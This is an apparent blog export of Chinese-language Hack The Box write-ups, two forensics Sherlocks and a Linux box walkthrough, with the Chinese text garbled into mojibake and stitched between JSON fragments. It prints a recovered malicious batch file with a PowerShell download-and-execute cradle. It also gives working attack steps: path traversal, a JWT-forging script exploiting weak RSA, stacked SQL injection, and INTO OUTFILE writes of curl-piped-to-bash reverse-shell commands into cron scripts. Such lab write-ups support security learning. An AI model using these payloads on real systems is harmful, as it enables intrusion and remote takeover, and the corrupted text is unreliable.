#\rå°†MFTæ–‡ä»¶è½¬ä¸ºCSVæ–‡ä»¶éœ€è¦ç”¨åˆ°ä¸‹é¢è¿™ä¸ªå·¥å…·\næˆ‘æ˜¯åœ¨Windowsç¯å¢ƒä¸‹ä½¿ç”¨çš„ï¼Œéœ€è¦å°†CMDå³é”®è®¾ç½®ä¸ºç®¡ç†å‘˜ä½¿ç”¨\nä½¿ç”¨ä¸‹é¢è¿™ä¸ªå·¥å…·æ¥è¿›è¡Œé˜…è¯»CSVæ–‡ä»¶\nTimeline Explorer | SANS Institute Task1 #\rSimon Stark äº 2 æœˆ 13 æ—¥æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚ä»–ä»ç”µå­é‚®ä»¶ä¸­æ”¶åˆ°çš„é“¾æ¥ä¸‹è½½äº†ä¸€ä¸ª ZIP æ–‡ä»¶ã€‚ä»–ä»é“¾æ¥ä¸‹è½½çš„ ZIP æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ\næŸ¥è¯¢æ–‡ä»¶åä¸­åŒ…å«.zipï¼Œç„¶ååŒ…å«httpå­—æ ·çš„è¡Œï¼Œå‘ç°ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶\nStage-20240213T093324Z-001.zip\nTask2 #\ræ£€æŸ¥æœ€åˆä¸‹è½½çš„ ZIP æ–‡ä»¶çš„ Zone Identifier å†…å®¹ã€‚æ­¤å­—æ®µæ˜¾ç¤ºä¸‹è½½æ–‡ä»¶çš„ HostUrlï¼Œåœ¨æˆ‘ä»¬çš„è°ƒæŸ¥/åˆ†æä¸­ç”¨ä½œæœ‰ä»·å€¼çš„å…¥ä¾µæŒ‡æ ‡ ï¼ˆIOCï¼‰ã€‚ä¸‹è½½æ­¤ ZIP æ–‡ä»¶çš„å®Œæ•´ä¸»æœº URL æ˜¯ä»€ä¹ˆï¼Ÿ\nå¯¹åº”çš„å®Œæ•´URLæ˜¯\nhttps://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser Task3 #\ræ‰§è¡Œæ¶æ„ä»£ç å¹¶è¿æ¥åˆ° C2 æœåŠ¡å™¨çš„æ¶æ„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œåç§°æ˜¯ä»€ä¹ˆï¼Ÿ\nå°è¯•æœç´¢å‹ç¼©åŒ…è§£å‹åçš„è·¯å¾„\nå‘ç°ä¸€ä¸ªå¯ç–‘çš„batæ–‡ä»¶\næ¶æ„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„\nC:\\Users\\simon.stark\\Downloads\\Stage-20240213T093324Z-001\\Stage\\invoice\\invoices\\invoice.bat Task4 #\råˆ†æä¹‹å‰æ ‡è¯†çš„æ–‡ä»¶çš„ $Created 0x30 æ—¶é—´æˆ³ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™åœ¨ç£ç›˜ä¸Šåˆ›å»ºçš„ï¼Ÿ\næŸ¥æ‰¾invoice.batçš„åˆ›å»ºæ—¶é—´ï¼š2024-02-13 16:38:39\nTask5 #\råœ¨è®¸å¤šè°ƒæŸ¥åœºæ™¯ä¸­ï¼ŒæŸ¥æ‰¾ MFT è®°å½•çš„åå…­è¿›åˆ¶åç§»é‡æ˜¯æœ‰ç›Šçš„ã€‚ä»é—®é¢˜ 3 ä¸­æ‰¾åˆ° stager æ–‡ä»¶çš„åå…­è¿›åˆ¶åç§»é‡ã€‚\næŸ¥è¯¢æ–‡ä»¶çš„Entry Numberä¸º23436\nå°†å…¶ä¹˜ä»¥1024ï¼ˆè¿™æ˜¯æ¯ä¸€æ¡è®°å½•çš„å¤§å°ï¼‰ç„¶åè½¬ä¸ºåå…­è¿›åˆ¶\nåç§»é‡ä¸ºï¼š16E3000\nTask6 #\ræ¯ä¸ª MFT è®°å½•çš„å¤§å°ä¸º 1024 å­—èŠ‚ã€‚å¦‚æœç£ç›˜ä¸Šçš„æ–‡ä»¶å¤§å°å°äº 1024 å­—èŠ‚ï¼Œåˆ™å¯ä»¥ç›´æ¥å­˜å‚¨åœ¨ MFT æ–‡ä»¶æœ¬èº«ä¸Šã€‚è¿™äº›æ–‡ä»¶ç§°ä¸º MFT é©»ç•™æ–‡ä»¶ã€‚åœ¨ Windows æ–‡ä»¶ç³»ç»Ÿè°ƒæŸ¥æœŸé—´ï¼ŒæŸ¥æ‰¾å¯èƒ½é©»ç•™åœ¨ MFT ä¸­çš„ä»»ä½•æ¶æ„/å¯ç–‘æ–‡ä»¶è‡³å…³é‡è¦ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°æ¶æ„æ–‡ä»¶/è„šæœ¬çš„å†…å®¹ã€‚æ‰¾åˆ°é—®é¢˜ 3 ä¸­å‘ç°çš„æ¶æ„æš‚å­˜ç¨‹åºçš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨ C2 IP å’Œç«¯å£å›ç­”ã€‚\nå› ä¸ºæˆ‘ä»¬å·²ç»æœ‰äº†åç§»é‡ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ä»»æ„åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€$MFTæ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯HxD\nè·³è½¬åˆ°åç§»é‡çš„ä½ç½®å¾€ä¸‹ä¸€ç‚¹ï¼Œèƒ½å‘ç°é©»ç•™åœ¨æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å†…å®¹\nå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼Œç›´æ¥å¤åˆ¶è¿‡æ¥æœ‰ä¸€äº›ç©ºå­—ç¬¦ä¼šçœ‹ä¸è§\n@echo off\rstart /b powershell.exe -nol -w 1 -nop -ep bypass \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF\u0003ï¿½W9uIGV0dw==\u0026#39;) -UseBasicParsing|iex\u0026#34;\r(goto) 2\u0026gt;nul \u0026amp; del \u0026#34;%~f0\u0026#34;\r= ","date":"2024-12-28","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-bft/","section":"Posts","summary":"","title":"Sherlocks-BFT","type":"posts"},{"content":"\rSherlock Scenario #\råœ¨æœ¬ Sherlock ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ Sysmon æ—¥å¿—å’Œå„ç§æœ‰ç”¨çš„ EventIDï¼Œç”¨äºè¯†åˆ«å’Œåˆ†æ Windows ç³»ç»Ÿä¸Šçš„æ¶æ„æ´»åŠ¨ã€‚Palo Alto çš„ Unit42 æœ€è¿‘å¯¹ UltraVNC æ´»åŠ¨è¿›è¡Œäº†ç ”ç©¶ï¼Œå…¶ä¸­æ”»å‡»è€…åˆ©ç”¨ UltraVNC çš„åé—¨ç‰ˆæœ¬æ¥ç»´æŠ¤å¯¹ç³»ç»Ÿçš„è®¿é—®ã€‚æ­¤å®éªŒå®¤å—è¯¥æ´»åŠ¨çš„å¯å‘ï¼ŒæŒ‡å¯¼å‚ä¸è€…å®Œæˆæ´»åŠ¨çš„åˆå§‹è®¿é—®é˜¶æ®µã€‚\nTask1 #\ræœ‰å¤šå°‘ä¸ªäº‹ä»¶ ID ä¸º 11 çš„äº‹ä»¶æ—¥å¿—ï¼Ÿ\nç­›é€‰æ—¥å¿—IDï¼Œå¾—åˆ°æ•°é‡æ˜¯ï¼š56\nTask2 #\ræ¯å½“åœ¨å†…å­˜ä¸­åˆ›å»ºè¿›ç¨‹æ—¶ï¼Œéƒ½ä¼šè®°å½•äº‹ä»¶ ID ä¸º 1 çš„äº‹ä»¶ï¼Œå…¶ä¸­åŒ…å«å‘½ä»¤è¡Œã€å“ˆå¸Œã€è¿›ç¨‹è·¯å¾„ã€çˆ¶è¿›ç¨‹è·¯å¾„ç­‰è¯¦ç»†ä¿¡æ¯ã€‚æ­¤ä¿¡æ¯å¯¹åˆ†æå¸ˆéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä½¿æˆ‘ä»¬èƒ½å¤ŸæŸ¥çœ‹ç³»ç»Ÿä¸Šæ‰§è¡Œçš„æ‰€æœ‰ç¨‹åºï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å‘ç°æ­£åœ¨æ‰§è¡Œçš„ä»»ä½•æ¶æ„è¿›ç¨‹ã€‚æ„ŸæŸ“å—å®³è€…ç³»ç»Ÿçš„æ¶æ„è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ\nç­›é€‰æ—¥å¿—IDä¸º1çš„æ—¥å¿—è¿›è¡ŒæŸ¥çœ‹\næ¶æ„è¿›ç¨‹ï¼šC:\\Users\\CyberJunkie\\Downloads\\Preventivo24.02.14.exe.exe\nTask3 #\rå“ªä¸ªäº‘é©±åŠ¨å™¨ç”¨äºåˆ†å‘æ¶æ„è½¯ä»¶ï¼Ÿ\næŸ¥è¯¢äº‹ä»¶IDä¸º22ï¼Œå‘ç°ä¸€ä¸ªå¯ç–‘çš„é“¾æ¥\næœç´¢dropboxusercontentå¾—åˆ°äº‘é©±åŠ¨å™¨æ˜¯dropbox\nTask4 #\rå¯¹äºå®ƒå†™å…¥ç£ç›˜çš„è®¸å¤šæ–‡ä»¶ï¼Œæœ€åˆçš„æ¶æ„æ–‡ä»¶ä½¿ç”¨äº†ä¸€ç§ç§°ä¸º Time Stomping çš„é˜²å¾¡è§„é¿æŠ€æœ¯ï¼Œå…¶ä¸­æ–‡ä»¶åˆ›å»ºæ—¥æœŸè¢«æ›´æ”¹ä»¥ä½¿å…¶çœ‹èµ·æ¥æ›´æ—§å¹¶ä¸å…¶ä»–æ–‡ä»¶æ··åˆã€‚PDF æ–‡ä»¶çš„æ—¶é—´æˆ³æ›´æ”¹ä¸ºä»€ä¹ˆï¼Ÿ\næœç´¢PDFï¼Œåœ¨IDä¸º2çš„äº‹ä»¶ä¸­å‘ç°äº‹ä»¶ä¿®æ”¹\næ—¶é—´æ˜¯ï¼š2024-01-14 08:10:06\nTask5 #\ræ¶æ„æ–‡ä»¶åœ¨ç£ç›˜ä¸Šæ”¾ç½®äº†ä¸€äº›æ–‡ä»¶ã€‚â€œonce.cmdâ€æ˜¯åœ¨ç£ç›˜ä¸Šçš„ä»€ä¹ˆåœ°æ–¹åˆ›å»ºçš„ï¼Ÿè¯·å›ç­”å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚\næœç´¢onceï¼Œåœ¨IDä¸º11çš„äº‹ä»¶ä¸­æ‰¾åˆ°è·¯å¾„\nTask6 #\ræ¶æ„æ–‡ä»¶è¯•å›¾è®¿é—®è™šæ‹ŸåŸŸï¼Œå¾ˆå¯èƒ½æ£€æŸ¥ Internet è¿æ¥çŠ¶æ€ã€‚å®ƒå°è¯•è¿æ¥åˆ°å“ªä¸ªåŸŸåï¼Ÿ\nåœ¨IDä¸º22çš„æ—¥å¿—ä¸­å‘ç°åŸŸå\nTask7 #\ræ¶æ„è¿›ç¨‹è¯•å›¾è”ç³»å“ªä¸ª IP åœ°å€ï¼Ÿ\nIDä¸º3çš„æ—¥å¿—è®°å½•ä¸IPç›¸å…³çš„ä¸œè¥¿\nIPåœ°å€ä¸ºï¼š93.184.216.34\nTask8 #\ræ¶æ„è¿›ç¨‹åœ¨ç”¨ UltraVNC çš„åé—¨å˜ä½“æ„ŸæŸ“ PC åè‡ªè¡Œç»ˆæ­¢ã€‚è¿›ç¨‹ä½•æ—¶è‡ªè¡Œç»ˆæ­¢ï¼Ÿ\næœç´¢VNCå¾—åˆ°IDä¸º2çš„äº‹ä»¶\nç»ˆæ­¢æ—¶é—´ä¸ºï¼š2024-02-14 03:41:58\n","date":"2024-12-25","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-unit42/","section":"Posts","summary":"","title":"Sherlocks-Unit42","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Yummy â¯ nmap yummy.htb -sSCV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 16:55 CST\rNmap scan report for yummy.htb (10.10.11.36)\rHost is up (0.095s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)\r|_ 256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)\r80/tcp open http Caddy httpd\r|_http-title: Yummy\r|_http-server-header: Caddy\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 11.45 seconds å¼€æ”¾ç«¯å£ï¼š22ã€80\nDirsearch #\r[root@kali] /home/kali/Yummy â¯ dirsearch -u yummy.htb -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545\rOutput File: /home/kali/Yummy/reports/_yummy.htb/_24-12-23_16-33-48.txt\rTarget: http://yummy.htb/\r[16:33:48] Starting: [16:33:50] 200 - 8KB - /register [16:33:50] 200 - 7KB - /login [16:33:52] 302 - 199B - /logout -\u0026gt; /login [16:33:55] 302 - 199B - /dashboard -\u0026gt; /login Task Completed DownloadBackups #\rè¿›å…¥ç½‘é¡µå…ˆæ³¨å†Œç”¨æˆ·ç„¶åç™»å½•ã€‚\nç„¶åè¿›å…¥BOOK A TABLEï¼Œéšä¾¿è¾“å…¥ä¿¡æ¯ç„¶åæäº¤\nç„¶åå›åˆ°Dashboradï¼Œæœ‰ä¸€ä¸ªä¸‹è½½é“¾æ¥ï¼Œä½¿ç”¨Burpsuiteè¿›è¡ŒæŠ“åŒ…\nç¬¬ä¸€ä¸ªGETè¯·æ±‚çš„reminderç›´æ¥æ”¾è¡Œ\nå¦‚æœé‡åˆ°æœåŠ¡å™¨æŠ¥é”™500ï¼Œéœ€è¦é‡æ–°æŠ“åŒ…å‘é€åˆ°repeaterã€‚\nç¬¬äºŒä¸ªåŒ…å‘é€åˆ°Repeaterï¼Œä¿®æ”¹URLå‚æ•°ï¼Œå¯ä»¥è¯»å–/etc/passwd\nå¹¶ä¸”åœ¨å…¶ä¸­å‘ç°äº†ä¸¤ä¸ªå­˜åœ¨çš„ç”¨æˆ·ï¼šdevã€qa\nå¹¶ä¸”èƒ½è¯»åˆ°ä¸€äº›CaddyæœåŠ¡å™¨çš„é…ç½®\nä½†æ˜¯æ²¡æœ‰å…¶ä»–çš„é…ç½®æ–‡ä»¶æˆ–è€…SSHå¯†é’¥èƒ½å¤Ÿç›´æ¥è¯»å–ï¼Œä½†æ˜¯è¯»å–å®šæ—¶ä»»åŠ¡çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªç±»ä¼¼äºæ–‡ä»¶å¤‡ä»½çš„è„šæœ¬\nè¯»å–è¿™ä¸ªapp_backup.shï¼Œå‘ç°ç›®å½•ä¸‹å­˜åœ¨æºç å¤‡ä»½æ–‡ä»¶\nç›´æ¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶\nGET /export/../../../../../var/www/backupapp.zip HTTP/1.1 è¯»å–é‡Œé¢çš„app.pyï¼Œå‘ç°æ•°æ®åº“å¯†ç æ³„éœ²\n[root@kali] /home/kali/Yummy/opt/app â¯ cat app.py from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response\rimport tempfile\rimport os\rimport shutil\rfrom datetime import datetime, timedelta, timezone\rfrom urllib.parse import quote\rfrom ics import Calendar, Event\rfrom middleware.verification import verify_token\rfrom config import signature\rimport pymysql.cursors\rfrom pymysql.constants import CLIENT\rimport jwt\rimport secrets\rimport hashlib\rapp = Flask(__name__, static_url_path=\u0026#39;/static\u0026#39;)\rtemp_dir = \u0026#39;\u0026#39;\rapp.secret_key = secrets.token_hex(32)\rdb_config = {\r\u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;,\r\u0026#39;user\u0026#39;: \u0026#39;chef\u0026#39;,\r\u0026#39;password\u0026#39;: \u0026#39;3wDo7gSRZIwIHRxZ!\u0026#39;,\r\u0026#39;database\u0026#39;: \u0026#39;yummy_db\u0026#39;,\r\u0026#39;cursorclass\u0026#39;: pymysql.cursors.DictCursor,\r\u0026#39;client_flag\u0026#39;: CLIENT.MULTI_STATEMENTS\r}\raccess_token = \u0026#39;\u0026#39;\r................\r................ JWT Token #\råœ¨configé‡Œå‘ç°äº†ä¸€ä¸ªRSAå¯†é’¥ç”Ÿæˆçš„è„šæœ¬\n#!/usr/bin/python3\rfrom Crypto.PublicKey import RSA\rfrom cryptography.hazmat.backends import default_backend\rfrom cryptography.hazmat.primitives import serialization\rimport sympy\r# Generate RSA key pair\rq = sympy.randprime(2**19, 2**20)\rn = sympy.randprime(2**1023, 2**1024) * q\re = 65537\rp = n // q\rphi_n = (p - 1) * (q - 1)\rd = pow(e, -1, phi_n)\rkey_data = {\u0026#39;n\u0026#39;: n, \u0026#39;e\u0026#39;: e, \u0026#39;d\u0026#39;: d, \u0026#39;p\u0026#39;: p, \u0026#39;q\u0026#39;: q}\rkey = RSA.construct((key_data[\u0026#39;n\u0026#39;], key_data[\u0026#39;e\u0026#39;], key_data[\u0026#39;d\u0026#39;], key_data[\u0026#39;p\u0026#39;], key_data[\u0026#39;q\u0026#39;]))\rprivate_key_bytes = key.export_key()\rprivate_key = serialization.load_pem_private_key(\rprivate_key_bytes,\rpassword=None,\rbackend=default_backend()\r)\rpublic_key = private_key.public_key() å°†JWTtokenæ‹¿å»è§£å¯†å¯ä»¥çœ‹åˆ°åœ¨Payloadä¸­æ³„éœ²äº†å¤§æ•´æ•°nå’Œeçš„æ•°å€¼\næ ¹æ®**RSA**ç®—æ³•å¯çŸ¥ï¼Œpå’Œqæ˜¯nçš„ä¸¤ä¸ªç´ å› å­ï¼Œå¯ä»¥ä½¿ç”¨åº“å‡½æ•°å¯¹nè¿›è¡Œåˆ†è§£ï¼Œä¸‹é¢çš„å®Œæ•´çš„è„šæœ¬\nimport base64\rimport json\rimport jwt\rfrom Crypto.PublicKey import RSA\rfrom cryptography.hazmat.backends import default_backend\rfrom cryptography.hazmat.primitives import serialization\rimport sympy\r#enter your jwt token here\rtoken = \u0026#34;\u0026#34;\rjs = json.loads(base64.b64decode( token.split(\u0026#34;.\u0026#34;)[1] + \u0026#34;===\u0026#34;).decode())\rn= int(js[\u0026#34;jwk\u0026#34;][\u0026#39;n\u0026#39;])\rp,q= list((sympy.factorint(n)).keys()) #divide n\re=65537\rphi_n = (p-1)*(q-1)\rd = pow(e, -1, phi_n)\rkey_data = {\u0026#39;n\u0026#39;: n, \u0026#39;e\u0026#39;: e, \u0026#39;d\u0026#39;: d, \u0026#39;p\u0026#39;: p, \u0026#39;q\u0026#39;: q}\rkey = RSA.construct((key_data[\u0026#39;n\u0026#39;], key_data[\u0026#39;e\u0026#39;], key_data[\u0026#39;d\u0026#39;], key_data[\u0026#39;p\u0026#39;], key_data[\u0026#39;q\u0026#39;]))\rprivate_key_bytes = key.export_key()\rprivate_key = serialization.load_pem_private_key(\rprivate_key_bytes,\rpassword=None,\rbackend=default_backend()\r)\rpublic_key = private_key.public_key()\rdata = jwt.decode(token, public_key, algorithms=[\u0026#34;RS256\u0026#34;] )\rdata[\u0026#34;role\u0026#34;] = \u0026#34;administrator\u0026#34;\r# Create new admin token new_token = jwt.encode(data, private_key, algorithm=\u0026#34;RS256\u0026#34;)\rprint(new_token) æ›¿æ¢æ–°çš„Tokenä¹‹åè¿›å…¥åˆ°äº†admindashboard\nSQL Injection #\ræ£€æŸ¥æºç ï¼Œåœ¨å‚æ•°order_queryä¸­æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤\n@app.route(\u0026#39;/admindashboard\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef admindashboard():\rvalidation = validate_login()\rif validation != \u0026#34;administrator\u0026#34;:\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\rtry:\rconnection = pymysql.connect(**db_config)\rwith connection.cursor() as cursor:\rsql = \u0026#34;SELECT * from appointments\u0026#34;\rcursor.execute(sql)\rconnection.commit()\rappointments = cursor.fetchall()\rsearch_query = request.args.get(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)\r# added option to order the reservations\rorder_query = request.args.get(\u0026#39;o\u0026#39;, \u0026#39;\u0026#39;)\rsql = f\u0026#34;SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}\u0026#34;\rcursor.execute(sql, (\u0026#39;%\u0026#39; + search_query + \u0026#39;%\u0026#39;,))\rconnection.commit()\rappointments = cursor.fetchall()\rconnection.close() å¹¶ä¸”é€šè¿‡unionæ³¨å…¥æˆ‘å‘ç°å­˜åœ¨æŠ¥é”™æ³¨å…¥çš„å¯èƒ½æ€§\nå°è¯•ä½¿ç”¨ExtractvalueæŠ¥é”™å¼•å‡ºUser\nhttp://yummy.htb/admindashboard?s=edu\u0026amp;o=ASC;select extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;))) ä¸è¿‡ä¼¼ä¹å¹¶ä¸èƒ½æŸ¥åˆ°é‡Œé¢çš„password\næ•°æ®åº“çš„secure_file_privè¢«è®¾ç½®ä¸ºäº†ç©ºï¼Œä¸æ˜¯NULLï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶å†™å…¥into outfile\nå›åˆ°ä¹‹å‰çš„å®šæ—¶ä»»åŠ¡ï¼Œé‡Œé¢å­˜åœ¨ä¸€ä¸ªmysqlçš„å®šæ—¶ä»»åŠ¡ä¼šæ‰§è¡Œä¸€ä¸ªdbmonitor.sh\né€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½å¾—åˆ°dbmonitor.sh\n#!/bin/bash\rtimestamp=$(/usr/bin/date)\rservice=mysql\rresponse=$(/usr/bin/systemctl is-active mysql)\rif [ \u0026#34;$response\u0026#34; != \u0026#39;active\u0026#39; ]; then\r/usr/bin/echo \u0026#34;{\\\u0026#34;status\\\u0026#34;: \\\u0026#34;The database is down\\\u0026#34;, \\\u0026#34;time\\\u0026#34;: \\\u0026#34;$timestamp\\\u0026#34;}\u0026#34; \u0026gt; /data/scripts/dbstatus.json\r/usr/bin/echo \u0026#34;$service is down, restarting!!!\u0026#34; | /usr/bin/mail -s \u0026#34;$service is down!!!\u0026#34; root\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34;\relse\rif [ -f /data/scripts/dbstatus.json ]; then\rif grep -q \u0026#34;database is down\u0026#34; /data/scripts/dbstatus.json 2\u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;The database was down at $timestamp. Sending notification.\u0026#34;\r/usr/bin/echo \u0026#34;$service was down at $timestamp but came back up.\u0026#34; | /usr/bin/mail -s \u0026#34;$service was down!\u0026#34; root\r/usr/bin/rm -f /data/scripts/dbstatus.json\relse\r/usr/bin/rm -f /data/scripts/dbstatus.json\r/usr/bin/echo \u0026#34;The automation failed in some way, attempting to fix it.\u0026#34;\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34;\rfi\relse\r/usr/bin/echo \u0026#34;Response is OK.\u0026#34;\rfi\rfi\r[ -f dbstatus.json ] \u0026amp;\u0026amp; /usr/bin/rm -f dbstatus.json MySQL æœåŠ¡æ´»è·ƒæ—¶çš„å¤„ç†ï¼š\nå¦‚æœ MySQL æœåŠ¡ æ´»è·ƒï¼Œä¸” /data/scripts/dbstatus.json æ–‡ä»¶å­˜åœ¨ï¼š å¦‚æœ dbstatus.json æ–‡ä»¶å†…å®¹ä¸­åŒ…å« \u0026ldquo;database is down\u0026rdquo;ï¼Œè¯´æ˜æ•°æ®åº“ä¹‹å‰å‡ºç°è¿‡æ•…éšœï¼Œå‘é€æ¢å¤é€šçŸ¥ï¼Œå¹¶åˆ é™¤çŠ¶æ€æ–‡ä»¶ï¼š /usr/bin/echo \u0026#34;$service was down at $timestamp but came back up.\u0026#34; | /usr/bin/mail -s \u0026#34;$service was down!\u0026#34; root\r/usr/bin/rm -f /data/scripts/dbstatus.json å¦‚æœ dbstatus.json æ–‡ä»¶å†…å®¹æœªåŒ…å« \u0026ldquo;database is down\u0026rdquo;ï¼Œåˆ™è®¤ä¸ºè‡ªåŠ¨åŒ–è¿‡ç¨‹å¤±è´¥ï¼Œé‡æ–°æ‰§è¡Œæœ€æ–°çš„ä¿®å¤è„šæœ¬ï¼š /usr/bin/echo \u0026#34;The automation failed in some way, attempting to fix it.\u0026#34;\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34; çœ‹åˆ°æœ‰ä¸€ä¸ª/data/scripts/fixer-v*ï¼Œç”±äºè¿™é‡Œå­˜åœ¨ä¸€ä¸ªé€šé…ç¬¦ï¼Œå¹¶ä¸”é…åˆæˆ‘ä»¬ä¹‹å‰çŒœæµ‹å¯ä»¥è¿›è¡ŒMysqlå†™å…¥æ–‡ä»¶ï¼Œå¯ä»¥å°è¯•å†™å…¥ä¸€ä¸ªåŒ…å«bashè„šæœ¬çš„ä¸€ä¸ªæ–‡ä»¶ç„¶åç­‰å¾…å®šæ—¶ä»»åŠ¡è¢«æ‰§è¡Œï¼Œç›‘å¬åå¼¹Shell\n# /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\r# You can also override PATH, but by default, newer versions inherit it from the environment\r#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 *\t* * *\troot\tcd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r#\r*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh\r*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh\r* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh åœ¨/etc/crontabä¸­å‘ç°ï¼Œmysqlæ¯ä¸€åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡æ‰§è¡Œdbmonitor.sh\né¦–å…ˆè¦å†™å…¥jsonæ–‡ä»¶ï¼Œç„¶åå†å†™å…¥ä¸€ä¸ªç¬¦åˆæ­£åˆ™åŒ¹é…çš„è„šæœ¬\n#1\rselect+\u0026#34;curl+10.10.xx.xx/rev.sh+|bash;\u0026#34;+INTO+OUTFILE++\u0026#39;/data/scripts/dbstatus.json\u0026#39;; #2\rselect+\u0026#34;curl+10.10.xx.xx/rev.sh+|bash;\u0026#34;+INTO+OUTFILE++\u0026#39;/data/scripts/fixer-v___\u0026#39;; User #\råœ¨å®šæ—¶ä»»åŠ¡é‡Œé¢å¯ä»¥æ³¨æ„åˆ°ï¼Œé™¤äº†mysqlè¿˜æœ‰ä¸€ä¸ªwww-dataçš„å®šæ—¶ä»»åŠ¡ï¼Œå› æ­¤å¯ä»¥å°†ä¸€ä¸ª**åå¼¹Shell**é‡å‘½åä¸ºapp_backup.shç­‰å¾…www-dataå»æ‰§è¡Œ\nmysql@yummy:/data/scripts$ wget 10.10.xx.xx/rev2.sh\rmysql@yummy:/data/scripts$ mv app_backup.sh app_backup_old.sh\rmv app_backup.sh app_backup_old.sh\rmysql@yummy:/data/scripts$ mv rev2.sh app_backup.sh\rmv rev2.sh app_backup.sh\rmysql@yummy:/data/scripts$ ls\rls\rapp_backup_old.sh\rapp_backup.sh\rdbmonitor.sh\rfixer-v1.0.1.sh\rsqlappointments.sql\rtable_cleanup.sh 